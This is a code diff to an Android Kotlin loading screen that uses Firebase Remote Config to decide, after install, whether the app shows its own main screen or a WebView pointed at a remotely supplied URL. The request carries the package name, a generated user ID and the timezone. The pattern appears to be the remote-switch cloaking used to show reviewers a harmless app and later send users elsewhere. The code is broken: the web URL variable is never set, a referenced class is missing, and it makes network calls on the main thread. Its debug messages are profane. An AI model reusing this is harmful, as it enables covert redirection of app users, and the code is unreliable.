@@ -1,38 +1,50 @@
 package com.template
 
+import android.content.ContentValues.TAG
 import android.content.Context
 import android.content.Intent
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import com.google.firebase.FirebaseApp
+import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
 import org.json.JSONObject
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.UUID
 
 class LoadingActivity : AppCompatActivity() {
 
 
     private lateinit var progressBar: ProgressBar
-    var finalUrl : String = ""
+    var finalUrl: String = ""
+    var urlForWeb: String = ""
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_loading)
         progressBar = findViewById(R.id.progress_bar)
 
+        // FirebaseApp.initializeApp(applicationContext)
+        // FirebaseAnalytics.getInstance(this)
+
         val sharedPreferences = getPreferences(Context.MODE_PRIVATE)
         val firstLaunch = sharedPreferences.getBoolean("app_first_launch", true)
         val sharedPreferencesFirebaseUrl = sharedPreferences.getString("firebase_url", "")
+        val sharedPreferencesFinalUrl = sharedPreferences.getString("final_url", "")
 
         if (isNetworkAvailable()) {
             if (firstLaunch) {
                 val editor = sharedPreferences.edit()
-
                 if (sharedPreferencesFirebaseUrl.isNullOrEmpty()) {
                     val remoteConfig: FirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
                     val configSettings = FirebaseRemoteConfigSettings.Builder()
@@ -51,60 +63,111 @@ class LoadingActivity : AppCompatActivity() {
                     val packageName = applicationContext.packageName
                     val userId = UUID.randomUUID().toString()
                     val timeZone = java.util.TimeZone.getDefault().id
-                    val utmParameters = "utm_source=google-play&amp;utm_medium=organic"
+                    val utmParameters = "utm_source=google-play&utm_medium=organic"
 
-                    finalUrl = "$firebaseUrl/?packageid=$packageName&userId=$userId&getz=$timeZone&$utmParameters"
+                    finalUrl =
+                        "$firebaseUrl/?packageid=$packageName&usserid=$userId&getz=$timeZone&getr=$utmParameters"
+                    editor.putString("final_url", finalUrl)
+                    editor.apply()
+
+                    val checkLink = remoteConfig.getString("check_link")
+                    if (checkLink.isNotBlank() && checkLink.startsWith("http")) {
+                        Toast.makeText(this, "ПОЛУЧИЛИ ЕБУЧУЮ ЧЕК ЛИНКУ", Toast.LENGTH_SHORT).show()
+                    } else {
+                        Toast.makeText(this, "ОБОСРАЛИСЬ", Toast.LENGTH_SHORT).show()
+                    }
 
                     if (sharedPreferences.getString("firebase_url", "").isNullOrEmpty()) {
                         openMainActivity()
-                        Toast.makeText(this, "линки небыло 1 запуск", Toast.LENGTH_SHORT).show()
+                        //1 запуск, линки небыло, открываем мейн
 
                     } else {
-                       // sharedPreferences.getString("firebase_url", "")?.let { openWebActivity(it) }
-                        openWebActivity(firebaseUrl)
-                        Toast.makeText(
-                            this,
-                            "линка была, 1 запуск, открыли вебактивити",
-                            Toast.LENGTH_SHORT
-                        ).show()
 
+                        val downloadTask = DownloadTask()
+                        downloadTask.execute(checkLink)
+
+                        val defaults: Map<String, Any> = mapOf(
+                            "check_link" to finalUrl
+                        )
+                        remoteConfig.setDefaultsAsync(defaults)
+                        val cacheExpiration: Long = 3600
+                        remoteConfig.fetch(cacheExpiration).addOnCompleteListener { task ->
+                            if (task.isSuccessful) {
+                                Log.d(TAG, "ZZZZZZZZZZZZZZZZZZZZZZZZссылка есть, заебок")
+                                remoteConfig.activate()
+
+                                // Получаем значение параметра check_link
+                                val checkLink = remoteConfig.getString("check_link")
+                                Log.d(TAG, "ZZZZZZZZZZZZZZZZZZZZZZZZсобственно, ссылка: $checkLink")
+
+                                // Делаем запрос к серверу по полученной ссылке
+                                val url = URL(checkLink)
+                                val urlConnection = url.openConnection() as HttpURLConnection
+                                try {
+                                    val inputStream = urlConnection.inputStream
+                                    val bufferedReader = BufferedReader(InputStreamReader(inputStream))
+                                    val response = StringBuilder()
+                                    bufferedReader.forEachLine { response.append(it) }
+                                    Log.d(TAG, "ZZZZZZZZZZZZZZZZZZZZZZZZОТВЕТ СЕРВЕРА $response")
+                                } finally {
+                                    urlConnection.disconnect()
+                                }
+                            } else {
+                                Log.e(TAG, "ZZZZZZZZZZZZZZZZZZZZZZZZМЫ ОБОСРАЛИСЬ: ${task.exception}")
+                            }
+                        }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                        openWebActivity(urlForWeb)
+                        //1 запуск, линка есть, открываем веб
                     }
                 } else {
-                    openWebActivity(sharedPreferencesFirebaseUrl)
-                    Toast.makeText(this, "1 запуск, линк", Toast.LENGTH_SHORT).show()
+                    openWebActivity(urlForWeb)
+                    //1 запуск, линка есть, открываем веб
 
                 }
                 editor.putBoolean("app_first_launch", false)
                 editor.apply()
 
-                //если 2 запуск
+
+                //обработка последующих запусков
             } else {
+                //линки небыло, открываем мэйн
                 if (sharedPreferencesFirebaseUrl.isNullOrEmpty()) {
                     openMainActivity()
-                    Toast.makeText(
-                        this,
-                        "2 запуск, линки небыло, открываем мэйн",
-                        Toast.LENGTH_LONG
-                    ).show()
-
+                    //линка была, открываем веб
                 } else {
-                    openWebActivity(sharedPreferencesFirebaseUrl)
-                    Toast.makeText(
-                        this,
-                        "2 запуск линка была, открываем веб",
-                        Toast.LENGTH_LONG
-                    ).show()
+                    openWebActivity(urlForWeb)
                 }
             }
+            //Нет подключения к интернету, открываем мэйн, флаг app_first_launch не меняем
         } else {
             openMainActivity()
-            Toast.makeText(
-                this,
-                "Нет подключения к интернету, открываем мэйн, флаг app_first_launch не меняем",
-                Toast.LENGTH_LONG
-            ).show()
         }
-
     }
 
     private fun openMainActivity() {
@@ -113,9 +176,9 @@ class LoadingActivity : AppCompatActivity() {
         finish()
     }
 
-    private fun openWebActivity(finalUrl : String) {
+    private fun openWebActivity(urlForWeb: String) {
         val intent = Intent(this, WebActivity::class.java)
-        intent.putExtra("url", finalUrl)
+        intent.putExtra("url", urlForWeb)
         startActivity(intent)
         finish()
     }
@@ -154,6 +217,5 @@ class LoadingActivity : AppCompatActivity() {
         }
         return false
     }
-
 
 }
